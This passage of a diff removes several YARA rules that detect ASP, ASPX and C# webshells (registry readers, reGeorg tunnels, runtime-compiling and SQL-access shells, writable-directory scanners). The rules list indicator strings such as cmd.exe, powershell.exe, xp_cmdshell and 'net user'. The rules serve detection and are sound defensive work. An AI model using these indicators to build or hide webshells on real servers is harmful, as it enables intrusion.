-            any of ( $asp_streamwriter* )
-        )
-        )
-        ) )
-}
-
-rule WEBSHELL_ASP_Generic_Registry_Reader
-{
-    meta:
-        description = "Generic ASP webshell which reads the registry (might look for passwords, license keys, database settings, general recon, ..."
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        score = 50
-        hash = "4d53416398a89aef3a39f63338a7c1bf2d3fcda4"
-        hash = "f85cf490d7eb4484b415bea08b7e24742704bdda"
-        hash = "898ebfa1757dcbbecb2afcdab1560d72ae6940de"
-
-        id = "02d6f95f-1801-5fb0-8ab8-92176cf2fdd7"
-    strings:
-        /* $asp_reg1  = "Registry" fullword wide ascii */ /* too many matches issues */
-        $asp_reg2  = "LocalMachine" fullword wide ascii
-        $asp_reg3  = "ClassesRoot" fullword wide ascii
-        $asp_reg4  = "CurrentUser" fullword wide ascii
-        $asp_reg5  = "Users" fullword wide ascii
-        $asp_reg6  = "CurrentConfig" fullword wide ascii
-        $asp_reg7  = "Microsoft.Win32" fullword wide ascii
-        $asp_reg8  = "OpenSubKey" fullword wide ascii
-
-        $sus1 = "shell" fullword nocase wide ascii
-        $sus2 = "cmd.exe" fullword wide ascii
-        $sus3 = "<form " wide ascii
-        $sus4 = "<table " wide ascii
-        $sus5 = "System.Security.SecurityException" wide ascii
-
-        $fp1 = "Avira Operations GmbH" wide
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and all of ( $asp_reg* ) and any of ( $sus* ) and not any of ( $fp* ) and
-        ( filesize < 10KB or
-        ( filesize < 150KB and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        ) )
-}
-
-rule WEBSHELL_ASPX_Regeorg_CSHARP
-{
-    meta:
-        description = "Webshell regeorg aspx c# version"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        reference = "https://github.com/sensepost/reGeorg"
-        hash = "c1f43b7cf46ba12cfc1357b17e4f5af408740af7ae70572c9cf988ac50260ce1"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        score = 75
-        date = "2021/01/11"
-        modified = "2023-07-05"
-        hash = "479c1e1f1c263abe339de8be99806c733da4e8c1"
-        hash = "38a1f1fc4e30c0b4ad6e7f0e1df5a92a7d05020b"
-        hash = "e54f1a3eab740201feda235835fc0aa2e0c44ba9"
-        hash = "aea0999c6e5952ec04bf9ee717469250cddf8a6f"
-
-        id = "0a53d368-5f1b-55b7-b08f-36b0f8c5612f"
-    strings:
-        $input_sa1 = "Request.QueryString.Get" fullword nocase wide ascii
-        $input_sa2 = "Request.Headers.Get" fullword nocase wide ascii
-        $sa1 = "AddressFamily.InterNetwork" fullword nocase wide ascii
-        $sa2 = "Response.AddHeader" fullword nocase wide ascii
-        $sa3 = "Request.InputStream.Read" nocase wide ascii
-        $sa4 = "Response.BinaryWrite" nocase wide ascii
-        $sa5 = "Socket" nocase wide ascii
-        $georg = "Response.Write(\"Georg says, 'All seems fine'\")"
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        filesize < 300KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and
-        ( $georg or
-        ( all of ( $sa* ) and any of ( $input_sa* ) ) )
-}
-
-rule WEBSHELL_CSHARP_Generic
-{
-    meta:
-        description = "Webshell in c#"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        hash = "b6721683aadc4b4eba4f081f2bc6bc57adfc0e378f6d80e2bfa0b1e3e57c85c7"
-        date = "2021/01/11"
-        modified = "2023-07-05"
-        hash = "4b365fc9ddc8b247a12f4648cd5c91ee65e33fae"
-        hash = "019eb61a6b5046502808fb5ab2925be65c0539b4"
-        hash = "620ee444517df8e28f95e4046cd7509ac86cd514"
-        hash = "a91320483df0178eb3cafea830c1bd94585fc896"
-
-        id = "6d38a6b0-b1d2-51b0-9239-319f1fea7cae"
-    strings:
-        $input_http = "Request." nocase wide ascii
-        $input_form1 = "<asp:" nocase wide ascii
-        $input_form2 = ".text" nocase wide ascii
-        $exec_proc1 = "new Process" nocase wide ascii
-        $exec_proc2 = "start(" nocase wide ascii
-        $exec_shell1 = "cmd.exe" nocase wide ascii
-        $exec_shell2 = "powershell.exe" nocase wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and filesize < 300KB and
-        ( $input_http or all of ( $input_form* ) ) and all of ( $exec_proc* ) and any of ( $exec_shell* )
-}
-
-rule WEBSHELL_ASP_Runtime_Compile : FILE {
-    meta:
-        description = "ASP webshell compiling payload in memory at runtime, e.g. sharpyshell"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "https://github.com/antonioCoco/SharPyShell"
-        date = "2021/01/11"
-        modified = "2023-04-05"
-        score = 75
-        hash = "e826c4139282818d38dcccd35c7ae6857b1d1d01"
-        hash = "e20e078d9fcbb209e3733a06ad21847c5c5f0e52"
-        hash = "57f758137aa3a125e4af809789f3681d1b08ee5b"
-        hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
-        hash = "e44058dd1f08405e59d411d37d2ebc3253e2140385fa2023f9457474031b48ee"
-        hash = "f6092ab5c8d491ae43c9e1838c5fd79480055033b081945d16ff0f1aaf25e6c7"
-        hash = "dfd30139e66cba45b2ad679c357a1e2f565e6b3140a17e36e29a1e5839e87c5e"
-        hash = "89eac7423dbf86eb0b443d8dd14252b4208e7462ac2971c99f257876388fccf2"
-        hash = "8ce4eaf111c66c2e6c08a271d849204832713f8b66aceb5dadc293b818ccca9e"
-        id = "5da9318d-f542-5603-a111-5b240f566d47"
-    strings:
-        $payload_reflection1 = "System" fullword nocase wide ascii
-        $payload_reflection2 = "Reflection" fullword nocase wide ascii
-        $payload_reflection3 = "Assembly" fullword nocase wide ascii
-        $payload_load_reflection1 = /[."']Load\b/ nocase wide ascii
-        // only match on "load" or variable which might contain "load"
-        $payload_load_reflection2 = /\bGetMethod\(("load|\w)/ nocase wide ascii
-        $payload_compile1 = "GenerateInMemory" nocase wide ascii
-        $payload_compile2 = "CompileAssemblyFromSource" nocase wide ascii
-        $payload_invoke1 = "Invoke" fullword nocase wide ascii
-        $payload_invoke2 = "CreateInstance" fullword nocase wide ascii
-        $payload_xamlreader1 = "XamlReader" fullword nocase wide ascii
-        $payload_xamlreader2 = "Parse" fullword nocase wide ascii
-        $payload_xamlreader3 = "assembly=" nocase wide ascii
-        $payload_powershell1 = "PSObject" fullword nocase wide ascii
-        $payload_powershell2 = "Invoke" fullword nocase wide ascii
-        $payload_powershell3 = "CreateRunspace" fullword nocase wide ascii
-        $rc_fp1 = "Request.MapPath"
-        $rc_fp2 = "<body><mono:MonoSamplesHeader runat=\"server\"/>" wide ascii
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_input4 = "\\u0065\\u0071\\u0075" wide ascii // equ of Request
-        $asp_input5 = "\\u0065\\u0073\\u0074" wide ascii // est of Request
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-        $sus_refl1 = " ^= " wide ascii
-        $sus_refl2 = "SharPy" wide ascii
-
-    condition:
-        //any of them or
-        (
-            (
-                filesize < 50KB and
-                any of ( $sus_refl* )
-            ) or
-            filesize < 10KB
-        ) and
-        (
-                any of ( $asp_input* ) or
-            (
-                $asp_xml_http and
-                any of ( $asp_xml_method* )
-            ) or
-            (
-                any of ( $asp_form* ) and
-                any of ( $asp_text* ) and
-                $asp_asp
-            )
-        )
-        and not any of ( $rc_fp* ) and
-        (
-            (
-                all of ( $payload_reflection* ) and
-                any of ( $payload_load_reflection* )
-            )
-            or
-            (
-                all of ( $payload_compile* ) and
-                any of ( $payload_invoke* )
-            )
-            or all of ( $payload_xamlreader* )
-            or all of ( $payload_powershell* )
-        )
-}
-
-rule WEBSHELL_ASP_SQL
-{
-    meta:
-        description = "ASP webshell giving SQL access. Might also be a dual use tool."
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        hash = "216c1dd950e0718e35bc4834c5abdc2229de3612"
-        hash = "ffe44e9985d381261a6e80f55770833e4b78424bn"
-        hash = "3d7cd32d53abc7f39faed133e0a8f95a09932b64"
-        hash = "f19cc178f1cfad8601f5eea2352cdbd2d6f94e7e"
-        hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"
-
-        id = "e534dcb9-40ab-544f-ae55-89fb21c422e9"
-    strings:
-        $sql1 = "SqlConnection" fullword wide ascii
-        $sql2 = "SQLConnection" fullword wide ascii
-        $sql3 = "System" fullword wide ascii
-        $sql4 = "Data" fullword wide ascii
-        $sql5 = "SqlClient" fullword wide ascii
-        $sql6 = "SQLClient" fullword wide ascii
-        $sql7 = "Open" fullword wide ascii
-        $sql8 = "SqlCommand" fullword wide ascii
-        $sql9 = "SQLCommand" fullword wide ascii
-
-        $o_sql1 = "SQLOLEDB" fullword wide ascii
-        $o_sql2 = "CreateObject" fullword wide ascii
-        $o_sql3 = "open" fullword wide ascii
-
-        $a_sql1 = "ADODB.Connection" fullword wide ascii
-        $a_sql2 = "adodb.connection" fullword wide ascii
-        $a_sql3 = "CreateObject" fullword wide ascii
-        $a_sql4 = "createobject" fullword wide ascii
-        $a_sql5 = "open" fullword wide ascii
-
-        $c_sql1 = "System.Data.SqlClient" fullword wide ascii
-        $c_sql2 = "sqlConnection" fullword wide ascii
-        $c_sql3 = "open" fullword wide ascii
-
-        $sus1 = "shell" fullword nocase wide ascii
-        $sus2 = "xp_cmdshell" fullword nocase wide ascii
-        $sus3 = "aspxspy" fullword nocase wide ascii
-        $sus4 = "_KillMe" wide ascii
-        $sus5 = "cmd.exe" fullword wide ascii
-        $sus6 = "cmd /c" fullword wide ascii
-        $sus7 = "net user" fullword wide ascii
-        $sus8 = "\\x2D\\x3E\\x7C" wide ascii
-        $sus9 = "Hacker" fullword wide ascii
-        $sus10 = "hacker" fullword wide ascii
-        $sus11 = "HACKER" fullword wide ascii
-        $sus12 = "webshell" wide ascii
-        $sus13 = "equest[\"sql\"]" wide ascii
-        $sus14 = "equest(\"sql\")" wide ascii
-        $sus15 = { e5 bc 80 e5 a7 8b e5 af bc e5 }
-        $sus16 = "\"sqlCommand\"" wide ascii
-        $sus17 = "\"sqlcommand\"" wide ascii
-
-        //$slightly_sus1 = "select * from " wide ascii
-        //$slightly_sus2 = "SELECT * FROM " wide ascii
-        $slightly_sus3 = "SHOW COLUMNS FROM " wide ascii
-        $slightly_sus4 = "show columns from " wide ascii
-
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and
-        ( 6 of ( $sql* ) or all of ( $o_sql* ) or 3 of ( $a_sql* ) or all of ( $c_sql* ) ) and
-        ( ( filesize < 150KB and any of ( $sus* ) ) or
-        ( filesize < 5KB and any of ( $slightly_sus* ) ) )
-}
-
-rule WEBSHELL_ASP_Scan_Writable
-{
-    meta:
-        description = "ASP webshell searching for writable directories (to hide more webshells ...)"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/03/14"
-        modified = "2023-04-05"
-        hash = "2409eda9047085baf12e0f1b9d0b357672f7a152"
-        hash = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"
-
-        id = "1766e081-0591-59ab-b546-b13207764b4d"
-    strings:
-        $scan1 = "DirectoryInfo" nocase fullword wide ascii
-        $scan2 = "GetDirectories" nocase fullword wide ascii
-        $scan3 = "Create" nocase fullword wide ascii
-        $scan4 = "File" nocase fullword wide ascii
-        $scan5 = "System.IO" nocase fullword wide ascii
-        // two methods: check permissions or write and delete:
-        $scan6 = "CanWrite" nocase fullword wide ascii
-        $scan7 = "Delete" nocase fullword wide ascii
-
-
-        $sus1 = "upload" nocase fullword wide ascii
-        $sus2 = "shell" nocase wide ascii
-        $sus3 = "orking directory" nocase fullword wide ascii
-        $sus4 = "scan" nocase wide ascii
-
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
